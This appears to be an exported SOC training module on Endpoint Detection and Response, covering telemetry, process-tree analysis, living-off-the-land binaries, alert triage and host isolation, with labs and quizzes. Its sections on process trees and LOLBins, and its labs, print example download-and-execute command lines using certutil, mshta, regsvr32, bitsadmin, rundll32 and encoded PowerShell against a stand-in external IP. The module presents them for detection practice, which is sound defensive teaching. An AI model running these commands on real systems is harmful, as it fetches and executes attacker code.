intro: Endpoint Detection and Response covers how EDR agents collect telemetry and turn it into detections, and how to read the evidence. You will learn to judge process trees and parent-child relationships, recognize living-off-the-land binaries such as certutil and rundll32, work an alert with a consistent triage checklist, and decide when and how to contain a host. Endpoints are where most attacks execute, so these skills let a SOC confirm threats quickly and limit damage.

lessons.title: EDR architecture and telemetry
lessons.why: Most intrusions end on an endpoint. Understanding what EDR collects and how it decides tells you what it can prove and where it is blind.

p: An EDR product installs a lightweight agent on each endpoint. The agent runs sensors that watch process creation, image and DLL loads, file writes, registry changes, network connections, and sometimes script execution and memory events. On Windows it relies on kernel callbacks such as PsSetCreateProcessNotifyRoutineEx, minifilter drivers for file activity, the Event Tracing for Windows (ETW) providers, and AMSI for script content. On Linux and macOS it uses eBPF, kernel modules or the Endpoint Security framework. Because the sensor runs close to the kernel, it sees activity even when the attacker avoids dropping files.

The agent forwards telemetry to a cloud or on-premises backend where it is stored, enriched and analyzed at scale. Detections come from several layers: signatures and machine learning models on files, behavioral rules such as an Office application spawning a shell, indicators of attack mapped to MITRE ATT&CK techniques, and threat intelligence matches on hashes, domains and IPs. Local prevention can block or kill a process within milliseconds, while cloud analytics find patterns across the whole fleet. Alerts typically carry severity, the technique, the process tree and the affected host and user.

Traditional antivirus mostly inspects files against signatures and heuristics and gives a verdict about a file. EDR records a continuous history of behavior, so you can ask what happened before and after an alert: which parent started it, what it connected to, which files it touched. EDR also gives response actions such as isolating the host, killing a process, collecting a file or opening a remote shell for live response. Modern endpoint platforms combine both, and XDR extends the idea by correlating endpoint with email, identity, cloud and network data.

EDR is not magic. Hosts without an agent, such as unmanaged devices, printers and many IoT devices, are invisible. Attackers may try to tamper with or disable the agent, use kernel-level techniques or abuse legitimate tools to evade rules. Telemetry has retention limits, and some events are sampled or filtered for cost. Agents can be offline, so a quiet console may mean silence rather than safety. Check sensor health, last check-in time and coverage regularly, and pair EDR with network and identity logs to catch what any one source misses.

snippet.label: EDR event record (example)
snippet.text:
time: 2026-03-02T09:41:07Z  host: WS-ACCT-07  user: EXAMPLE\jdoe
event: ProcessCreate
image: C:\Windows\System32\cmd.exe
parent: C:\Program Files\Example Office\winword.exe
cmdline: cmd.exe /c whoami
sha256: 0f1e...a9 (simulated)  signer: Microsoft Windows

lessons.example: A SOC receives a medium-severity EDR alert on host WS-ACCT-07. The console shows more than the single detection: the process creation, the file written to the user's Temp folder two minutes earlier, and an outbound connection to 203.0.113.50. An antivirus alone would have reported only the file verdict. The analyst uses the timeline to reconstruct the sequence and sees the sensor last checked in 30 seconds ago, so the data is current.

terms.def: Recorded data about endpoint activity such as processes, files and connections.
An operating system hook that notifies a driver of events such as process creation.
Event Tracing for Windows, a built-in facility that emits detailed system events.
The Windows Antimalware Scan Interface that lets security tools inspect script content.
Extended detection and response that correlates data from many sources.

check.q: What does EDR record that classic antivirus often does not?
options: A continuous history of process and network behavior
check.why: EDR keeps behavioral history for investigation.

check.q: Which Windows facility lets security tools inspect script content?
check.why: AMSI exposes scripts to the scanner at run time.

check.q: Which is a known EDR blind spot?
check.why: Without an agent there is no telemetry.

check.q: What does a silent console from a host with a stale check-in time most likely mean?
options: The agent may be offline so absence of alerts is unreliable
check.why: No data does not prove no activity when the sensor is not reporting.

recap: EDR agents collect process, file, registry and network telemetry near the kernel.
Detection combines signatures, behavior rules, ML and intelligence.
Check agent coverage and health since silence can mean blindness.

lessons.title: Process trees and parent-child analysis
lessons.why: A process tree shows how execution unfolded. Judging parent and child pairs is the quickest way to tell a normal business app from an attack in progress.

p: Every process has a parent, shown by its parent process ID. An EDR draws these relationships as a tree, so you can follow an attack from the first process to the last. Start from the alert and walk up to find the root cause, then down to find what the process spawned. Note the process name, full path, command line, user, integrity level, start time, hash and signer. Context matters: the same powershell.exe can be an administrator's script or malware. Look at the path (System32 versus a user Temp folder) and the command-line arguments.

Some pairs are rarely legitimate. winword.exe, excel.exe or outlook.exe spawning cmd.exe, powershell.exe, wscript.exe or mshta.exe suggests a malicious macro or exploit. A browser spawning a shell, svchost.exe started by anything other than services.exe, lsass.exe with an unusual parent, and wmiprvse.exe or services.exe launching cmd.exe are worth attention. Expected relationships are equally useful: smss, csrss, wininit and services form the known system chain. A system binary running from the wrong folder, or with a misspelled name such as scvhost.exe, indicates masquerading.

Command lines often reveal intent: encoded commands (powershell -enc followed by base64), hidden window flags (-w hidden), download cradles such as IEX with DownloadString, or arguments that point to a remote URL. A SHA-256 hash lets you check file reputation and prevalence across the fleet; a hash seen on one host only is more suspicious than one seen on thousands. Check the digital signer: Microsoft-signed does not mean safe, because attackers abuse signed tools, but an unsigned binary in a user directory that makes network calls deserves scrutiny. Record each value in your notes.

Combine the pieces into a timeline: email attachment opened, Word started, macro spawned PowerShell, PowerShell downloaded a file, the file ran and made a network connection. Each step should be backed by an event. Look for persistence such as scheduled tasks, services or Run keys, and for credential access or lateral movement afterward. Distinguish what is confirmed from what is guessed. If a child process is blocked by EDR, the chain may end early, but you still need to find out whether anything else executed before the block.

snippet.label: Process tree
snippet.text:
explorer.exe (user jdoe)
  winword.exe  invoice_Q1.docm
    powershell.exe -w hidden -enc SQBFAFgAIAAoA...
      rundll32.exe C:\Users\jdoe\AppData\Local\Temp\a1.dll,Run
        (net) 203.0.113.50:443

lessons.example: The tree above shows Word spawning a hidden, encoded PowerShell, which then launches rundll32 against a DLL in the Temp folder and connects out to 203.0.113.50. Word has no reason to start PowerShell, the -enc and hidden flags hide intent, and a DLL in Temp is unusual. The analyst declares the chain malicious, notes the document name and DLL hash, and moves to containment, then searches the fleet for the same hash.

terms.def: The process that created another process.
The full text used to launch a process, including arguments.
Giving malware the name or look of a legitimate program.
How many hosts in the environment have a given file or hash.
The publisher named in a file's digital signature.

check.q: Which parent-child pair is most suspicious?
check.why: Office applications rarely launch PowerShell legitimately.

check.q: What does powershell -enc indicate?
options: An encoded base64 command that hides content
check.why: -EncodedCommand takes a base64 string that obscures the script.

check.q: A file hash seen on exactly one host in the fleet is
options: More suspicious than a hash seen on thousands
check.why: Low prevalence suggests a rare or targeted file.

check.q: Which name suggests masquerading?
check.why: A near-miss name in an odd path imitates a system binary.

recap: Walk up from the alert to the root cause, then down to the effects.
Office-to-shell and similar pairs are strong indicators.
Use command line, path, hash, signer and prevalence together.

lessons.title: Living-off-the-land binaries
lessons.why: Attackers prefer tools already on the system because they are trusted and leave no new files to scan. Recognizing their abuse is a core endpoint skill.

p: Living-off-the-land binaries, scripts and libraries (LOLBins) are legitimate, usually Microsoft-signed, programs that attackers misuse to download, execute, or hide malicious content. Using them avoids dropping obvious malware, may bypass application allowlisting and blends with administration. The community project LOLBAS (Living Off The Land Binaries, Scripts and Libraries) catalogs each binary with its abuse functions and maps them to ATT&CK, for example T1218 System Binary Proxy Execution. Detection rests on unusual arguments, parents, network activity and locations, since the binary itself is not malicious.

certutil.exe is a certificate tool abused with -urlcache -split -f to download files and -decode to decode base64 payloads. mshta.exe runs HTML applications and remote scripts. rundll32.exe loads a DLL and calls an exported function, used for proxy execution. regsvr32.exe with /s /u /i:URL scrobj.dll can run remote scriptlets. bitsadmin.exe creates background transfer jobs to download files. wmic.exe can run processes locally and remotely and query systems. Others include msbuild.exe, cscript, installutil and powershell itself.

Abuse is visible in command-line details. certutil with a URL, mshta or regsvr32 with an http address, rundll32 with a DLL from Temp, AppData or a Public folder, or with a function such as #1 or an odd name, bitsadmin with /transfer to an unusual host, and wmic with process call create against a remote node. Network connections initiated by binaries that normally do not touch the internet, like regsvr32 or rundll32, are strong evidence. Also notice the parent: a LOLBin spawned by an Office document or a script host raises suspicion further.

Build detections around parent-child pairs, rare arguments and outbound connections rather than the binary name. Consider baseline usage: your IT team may use certutil or bitsadmin legitimately, so allowlist those known uses precisely. Prevention options include application control such as WDAC or AppLocker, attack surface reduction rules, constrained PowerShell, removing unused features, and blocking outbound access from servers that do not need it. Log full command lines (Event ID 4688 with command line auditing, and Sysmon Event ID 1) so you have the data to detect and investigate.

snippet.label: Command lines to review
snippet.text:
certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\Users\Public\a.exe
mshta.exe http://203.0.113.50/x.hta
rundll32.exe C:\Users\jdoe\AppData\Local\Temp\a1.dll,Run
regsvr32 /s /u /i:http://203.0.113.50/s.sct scrobj.dll
bitsadmin /transfer j /download /priority high http://203.0.113.50/b.exe C:\Temp\b.exe

lessons.example: An analyst reviews a list of command lines from one host. The certutil line downloads a file from an external IP into the Public folder, which is not what certificate management looks like. The rundll32 line loads a DLL from the user's Temp folder. Both use trusted Microsoft binaries, yet the arguments and locations give them away. The analyst flags the two lines, retrieves the downloaded files for hashing, and checks LOLBAS to confirm the techniques.

terms.def: A legitimate system binary that attackers misuse for malicious purposes.
A community catalog documenting living-off-the-land binaries and their abuse.
Running malicious code through a trusted signed binary.
A policy such as AppLocker or WDAC that limits which programs may run.
A Microsoft tool that logs detailed process, network and file events.

check.q: Which certutil use is a red flag?
check.why: -urlcache with -f downloads a remote file.

check.q: Which binary is used for proxy execution of a DLL export?
check.why: rundll32 loads a DLL and calls a function.

check.q: Why is blocking by binary name alone not enough?
options: The binary has legitimate uses and attackers vary arguments
check.why: The same binary is used by admins, so detection must use arguments, parents and network.

check.q: Which log source provides full command lines on Windows?
options: Event ID 4688 with auditing, or Sysmon Event ID 1
check.why: Process creation auditing and Sysmon capture command lines.

recap: LOLBins are trusted tools used for download, execution and evasion.
certutil, mshta, rundll32, regsvr32, bitsadmin and wmic are frequent examples.
Detect by arguments, parents and network use; control with allowlisting.

lessons.title: EDR alert triage
lessons.why: An analyst sees many alerts each shift. A consistent checklist yields fast, defensible verdicts and keeps real threats from being buried.

p: Begin by understanding what fired: the rule name, the ATT&CK technique, severity and confidence. Identify the host, its role (laptop, server, domain controller) and criticality, and the user, including privilege level. A suspicious alert on a domain controller or an administrator account raises priority. Check whether the activity is still running or was blocked. Read the process tree and command line, and note the time relative to working hours. This quickly answers the basic questions: what happened, where, to whom and is it ongoing.

Look at the host's earlier alerts and recent behavior: new software installs, logons from odd places, other detections. Check prevalence: how many other hosts ran this file or command in the last 30 days. Wide prevalence, a trusted signer and a known deployment tool such as a software distribution agent point to a false positive. Check hash and domain reputation in threat intelligence, but treat a clean result as unknown rather than safe, since new malware has no history. Compare with known administrative activity, change tickets or scheduled maintenance windows.

Classify as true positive (malicious), benign true positive (real behavior that is authorized, such as a red-team test or admin script), false positive (detection error) or undetermined needing escalation. Record the evidence for the verdict: the specific events and fields. If you cannot decide, ask the user or their manager a precise question, or escalate to a senior analyst with your notes. Avoid anchoring on the first theory. Search for related activity on other hosts, because one alert is frequently one piece of a larger intrusion.

Write the case note so that another analyst can understand it without the console: summary, evidence, verdict, actions taken and open questions. For recurring false positives, propose a tuning change such as an exclusion limited to a specific path, parent, user group and command line, never a broad disable. Track time to triage and the true positive rate to find noisy rules. Good notes also protect you in later audits and support reporting to management, legal or the incident response team.

snippet.label: Triage checklist
snippet.text:
1. Rule/technique/severity: what fired?
2. Host role and criticality, user and privileges
3. Process tree + command line: blocked or running?
4. Host history: prior alerts, installs, logons
5. Prevalence, signer, hash/domain reputation
6. Change ticket or admin explanation?
7. Verdict + evidence + action + notes

lessons.example: An alert fires for powershell with an encoded command on a build server. The analyst sees the parent is the company's deployment agent, the same command ran on 40 build servers in the past week, the signer is the vendor, and a change ticket covers the rollout. The verdict is benign true positive, and the analyst proposes a narrow exclusion for that parent and command line. By contrast, the same command on an accountant's laptop spawned by Word would be escalated.

terms.def: An alert that correctly identifies malicious activity.
An alert that fires on benign activity by mistake.
Genuine detected behavior that is authorized or harmless.
How common a file or behavior is across the environment.
Adjusting detection rules to reduce noise without losing coverage.

check.q: Which factor most raises the priority of an alert?
options: It occurred on a domain controller with an admin account
It occurred on a test VM
check.why: Critical asset and privileged user increase impact.

check.q: A clean reputation result for a new hash means
options: It is unknown, not proven safe
check.why: New malware often has no reputation yet.

check.q: Which tuning change is best for a recurring false positive?
options: A narrow exclusion limited to the specific parent, path and user group
Lower the severity of all rules
check.why: Narrow exclusions keep detection coverage.

check.q: A real but authorized admin script detection is a
check.why: The behavior is real and authorized, so it is benign.

recap: Work through scope, user, history, prevalence, reputation and verdict.
Back every verdict with evidence and clear notes.
Tune narrowly and hunt for related activity on other hosts.

lessons.title: Containment and host isolation
lessons.why: Containment limits damage while you investigate. Acting too slowly lets an attacker spread, while acting too broadly disrupts the business.

p: Isolating a host cuts its network connections except for the EDR management channel, so the attacker loses remote control while you keep access. Isolate when there is confirmed or highly likely malicious activity, evidence of C2 or lateral movement, ransomware behavior, credential theft or when a critical account is involved. Weigh business impact: isolating a production server or a clinician's workstation needs coordination with owners. When severity is high and delay is costly, many playbooks authorize immediate isolation first and consultation after. Document who approved the action and when.

Beyond isolation, common actions are killing a malicious process or process tree, quarantining a file, blocking a hash, domain or IP at EDR, firewall or proxy, disabling or resetting a compromised account and revoking sessions and tokens, and removing malicious persistence such as scheduled tasks. Order matters: preserve volatile evidence where possible by collecting a triage package or memory image before reboot, then contain, then eradicate. Killing a process before collecting its details can lose information, but not stopping active ransomware loses data, so judge by urgency.

Keep a record of every response action with times in UTC, the analyst, the reason and the result. Preserve relevant files, logs and memory with hashes, and store them securely so they can be used by forensic teams or legal processes. Avoid logging in to the compromised host with privileged accounts that could expose credentials. Use the EDR live response feature with an account created for that purpose. Do not wipe or reimage a machine until investigation is complete and the incident lead approves.

After isolation, confirm that the host shows as isolated in the console and that known C2 connections stopped. Search the fleet for the same indicators to find other infected hosts. Remediation might mean reimaging, restoring from a known-good backup and resetting passwords for accounts used on that host. Only release the host from isolation after cleaning is verified and monitoring is in place, and note the release in the case. Capture lessons learned, such as the detection gap or missing control, to improve future response.

snippet.label: Response log entry
snippet.text:
2026-03-02 09:55Z  WS-ACCT-07  analyst: a.fake
09:52  Triage package collected (hash 7c1d...e2)
09:54  Process tree killed: winword.exe > powershell.exe
09:55  Host isolated (EDR network containment) - confirmed
09:57  Hash a1.dll blocked; 203.0.113.50 blocked at proxy
10:05  Account jdoe password reset, sessions revoked

lessons.example: A true positive shows a macro launching PowerShell that connects to 203.0.113.50 from WS-ACCT-07. The analyst collects the triage package, kills the process tree, isolates the host and confirms the console shows isolated status. She blocks the hash and IP, resets the user's password and searches the fleet, finding one more host with the same DLL. Each action is logged with a time and reason, and the user is told to leave the laptop connected but untouched.

terms.def: An EDR action that cuts the host's network access except to the management channel.
Actions that stop an incident from spreading or causing more harm.
Removing the attacker's presence such as malware and persistence.
A collection of volatile and key artifacts gathered from a host.
Remote shell and file access through the EDR console.

check.q: When is host isolation most appropriate?
options: Confirmed or highly likely malicious activity such as C2 or ransomware
check.why: Isolation stops attacker control when compromise is likely.

check.q: What should be done before reimaging a compromised host?
options: Preserve evidence and get approval from the incident lead
check.why: Evidence and authorization come before destruction of the system.

check.q: Which step confirms isolation worked?
options: Checking the console status and that C2 connections stopped
check.why: Verify the host is isolated and malicious traffic ceased.

check.q: Why log each response action with time and reason?
options: For accountability, handoff and later investigation
check.why: Records support audits, handoffs and forensic work.

recap: Isolate on confirmed malicious activity, weighing business impact.
Preserve evidence, then contain and eradicate in a sensible order.
Verify isolation, hunt for other hosts and document every action.

labs.title: Read the process tree
labs.scenario: An EDR alert fired on laptop WS-ACCT-07 for user EXAMPLE\jdoe shortly after the user opened an emailed attachment. The log viewer shows the process events in order.
labs.objective: Trace the tree from the attachment to the child shell and name the suspicious step.

steps.do: Open the alert and view the first event.
steps.see: 09:40:58 outlook.exe (PID 4120) wrote invoice_Q1.docm to Downloads.
09:41:03 explorer.exe started winword.exe invoice_Q1.docm.
09:41:07 winword.exe started cmd.exe /c whoami (PID 5532).
09:41:09 cmd.exe started powershell.exe -w hidden -enc SQBFAFgA...
09:41:12 powershell.exe connected to 203.0.113.50:443.

labs.answer: The suspicious step is winword.exe spawning cmd.exe and then hidden, encoded PowerShell, followed by an outbound connection to 203.0.113.50. A malicious macro in invoice_Q1.docm is the likely root cause.
labs.hint: Ask which application should never launch a shell.

labs.title: Spot the LOLBin
labs.scenario: The terminal lists five command lines collected from one workstation in the last hour. Two of them abuse trusted binaries.
labs.objective: Flag the certutil download and the rundll32 proxy execution.

steps.see: 1) ping 192.0.2.1  2) certutil -urlcache -split -f http://203.0.113.50/a.txt C:\Users\Public\a.exe  3) ipconfig /all  4) rundll32 C:\Users\jdoe\AppData\Local\Temp\a1.dll,Run  5) whoami
Line 2 flagged: certutil used to download a file (LOLBAS: Download).
Line 4 flagged: rundll32 executing a DLL from Temp (LOLBAS: Execute).
Line 1 is routine network testing. Not suspicious on its own.
Correct: lines 2 and 4 flagged. Lines 1, 3, 5 are common discovery commands, worth noting but benign alone.

labs.answer: Line 2 (certutil -urlcache -split -f to an external IP) is a download via LOLBin, and line 4 (rundll32 on a DLL in Temp) is proxy execution of malicious code. Lines 1, 3 and 5 are ordinary commands.
labs.hint: Look for URLs and Temp or Public folder paths.

labs.title: Triage an EDR alert
labs.scenario: An alert shows powershell -enc on server BUILD-12 spawned by the deployment agent. Use the SIEM views to decide whether it is real.
labs.objective: Check host history, file prevalence and user context and label the alert.

steps.see: Last 30 days: 0 prior alerts. Software deployment agent runs weekly.
Same command line seen on 39 other build servers in 7 days.
Account: EXAMPLE\svc-deploy (service account, expected on build servers).
Change CHG-1042: agent update rollout, 2026-03-02 window 09:00-11:00 UTC.
Options: True positive, False positive, Escalate.
Accepted. Suggested tuning: exclude parent deploy-agent.exe with this command hash on BUILD servers only.

labs.answer: The alert is a false positive (benign authorized activity): the deployment agent ran the same encoded command on 39 other servers under a service account during an approved change window. Add a narrow exclusion, not a broad disable.
labs.hint: Prevalence plus a change ticket is strong support.

labs.title: Isolate the host
labs.scenario: Confirmed malicious activity was found on WS-ACCT-07: macro, PowerShell and C2 to 203.0.113.50. You must choose containment actions in a sensible order.
labs.objective: Choose actions in order, confirm isolation and record them in the case notes.

steps.do: Select first action: collect triage package.
steps.see: Package collected, hash 7c1d...e2 stored in the case.

steps.do: Select: kill process tree winword > powershell.
steps.see: Processes terminated. No new child processes seen.
Isolation command sent. Console status: Isolated (management channel only).

steps.do: Select: block hash a1.dll and IP 203.0.113.50.
steps.see: Hash added to blocklist. IP blocked on proxy.

steps.do: Select: reset account and revoke sessions for jdoe.
steps.see: Password reset required and sessions revoked.

steps.do: Open case notes and record actions.
steps.see: Notes saved with UTC times and your analyst ID.

labs.answer: Correct order: collect evidence, kill the malicious processes, isolate the host and confirm status, block indicators, reset the compromised account, then record every action with times in the case notes. Do not reimage before approval.
labs.hint: Evidence first, then stop spread, then verify and document.

checkpoint.q: Which sensor technology gives EDR deep Windows process visibility?
checkpoint.why: Kernel callbacks and ETW supply process and system events.

checkpoint.q: How does EDR differ from classic AV?
options: It keeps behavioral history and offers response actions
checkpoint.why: EDR records behavior and allows isolation and live response.

checkpoint.q: Which parent-child pair is a strong malicious indicator?
checkpoint.why: Office launching a shell is typical of macro malware.

checkpoint.q: What does a rare hash seen on one host suggest?
options: Possibly a targeted or new file worth scrutiny

checkpoint.q: Which command is typical LOLBin download abuse?
What should regsvr32 with an http scriptlet address make you think of?
checkpoint.why: The /i:URL scrobj.dll pattern runs remote scripts.

checkpoint.q: Which is a benign true positive?
options: An authorized admin script that triggered a real detection
A false alert from a faulty rule
checkpoint.why: The behavior is real but authorized.

checkpoint.q: What is best for a recurring false positive?
options: Narrow exclusion by parent, path and user

checkpoint.q: What should come before reimaging a host?
checkpoint.why: Evidence and sign-off protect the investigation.

checkpoint.q: After isolating a host you should
options: Confirm status, hunt for the same indicators on other hosts and document
checkpoint.why: Verification, scoping and documentation complete containment.
